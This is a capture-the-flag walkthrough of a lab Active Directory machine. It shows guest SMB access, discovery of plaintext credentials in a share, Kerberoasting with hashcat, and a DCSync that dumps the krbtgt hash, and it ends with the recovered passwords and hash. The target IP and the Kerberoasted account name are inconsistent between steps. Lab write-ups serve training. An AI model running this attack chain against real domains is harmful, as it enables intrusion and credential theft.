+++
title = "MartiniAD - Walkthrough"
date = "2026-08-22"
author = "nvru"
description = "Walkthrough for the MartiniAD machine."
tags = [
"ctf",
"walkthrough",
"windows",
"active-directory",
"smb",
"kerberoasting",
"credential-disclosure",
"domain-admin"
]
draft = false
+++

## Overview

- **Platform:** HackSmarter
- **Difficulty:** `Easy`
- **OS:** Windows
- **Attacker IP:** `10.200.84.4`
- **Target IP:** `10.1.179.33`

The objective was to enumerate the Active Directory environment, identify exposed credentials, perform Kerberoasting to recover a service account password, and obtain the `krbtgt` NT hash.

---

## Enumeration

### Port Scanning

The initial scan revealed a typical Active Directory Domain Controller.

```text
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
```

The scan also revealed the domain name:

```text
DC01.DRY.MARTINI.BARS
```

To simplify name resolution, I added the domain to `/etc/hosts`.

```bash
echo "10.1.140.107 DRY.MARTINI.BARS" | sudo tee -a /etc/hosts
```

---

### SMB Enumeration

I first tested SMB using anonymous credentials.

```bash
nxc smb 10.1.140.107 -u '' -p '' --shares
```

An unusual share named **notes** was visible, although anonymous users did not have access to it.

![Anonymous SMB Enumeration](/images/hsm/martiniad/nxc_null.png)

Since Windows environments commonly expose the Guest account, I tested it next.

```bash
nxc smb 10.1.140.107 -u guest -p '' --shares
```

The Guest account authenticated successfully and had read/write access to the **notes** share, along with read access to the `IPC$` share.

![Guest SMB Enumeration](/images/hsm/martiniad/nxc_guest.png)

Because the Guest account could access `IPC$`, I enumerated the domain users.

```bash
nxc smb 10.1.140.107 -u guest -p '' --rid
```

![RID Enumeration](/images/hsm/martiniad/found_users.png)

The following accounts were discovered:

```text
Administrator
Guest
krbtgt
DC01$
mprice
athena.t0
ATHENA_SVC
```

---

### Credential Discovery

Using the Guest account, I connected to the `notes` share.

```bash
smbclient \\\\DRY.MARTINI.BARS\\notes -U guest
```

Inside the share I found a file named `notes.txt`.

![notes.txt](/images/hsm/martiniad/found_notes_txt.png)

After downloading and reading the file, it contained credentials for the `mprice` account.

![Credentials in notes.txt](/images/hsm/martiniad/cat_notes.png)

I verified the credentials against SMB.

```bash
nxc smb 10.1.140.107 -u mprice -p '*martini*' --shares
```

The login was successful.

![Successful Login](/images/hsm/martiniad/nxc_mprice.png)

---

## Credential Access

### Kerberoasting

Although the `mprice` account was low privileged, it was sufficient to continue enumerating Active Directory.

The `ATHENA_SVC` account appeared to be a service account, making it a suitable Kerberoasting target.

I requested the available Service Principal Names (SPNs).

```bash
GetUserSPNs.py -dc-ip 10.1.140.107 DRY.MARTINI.BARS/mprice:'*martini*' -outputfile misc/ker.krb
```

The Kerberos service ticket was then cracked with Hashcat.

```bash
hashcat -m 13100 -a 0 misc/ker.krb /opt/seclists/Passwords/Leaked-Databases/rockyou-75.txt
```

The recovered password was:

```text
1dirtymartini
```

To verify the credentials, I authenticated using NetExec.

```bash
nxc smb 10.1.140.107 -u athena.t0 -p '1dirtymartini' --shares
```

The output confirmed that `athena.t0` had administrative privileges on the domain.

---

## Domain Compromise

### DCSync

With Domain Administrator credentials available, I could perform a DCSync attack to retrieve password hashes from Active Directory.

To dump every account:

```bash
secretsdump.py 'athena.t0:1dirtymartini@DC01.DRY.MARTINI.BARS'
```

Since the objective was only to obtain the `krbtgt` hash, I limited the dump to that account.

```bash
secretsdump.py -just-dc-user krbtgt 'athena.t0:1dirtymartini@DC01.DRY.MARTINI.BARS'
```

![KRBTGT Hash](/images/hsm/martiniad/krbtgt_hash.png)

The command successfully returned the NT hash for the `krbtgt` account.

---

## Credentials

```text
mprice:*martini*

athena.t0:1dirtymartini

krbtgt:22ebc290e67668629c8d0812662a9c51
```
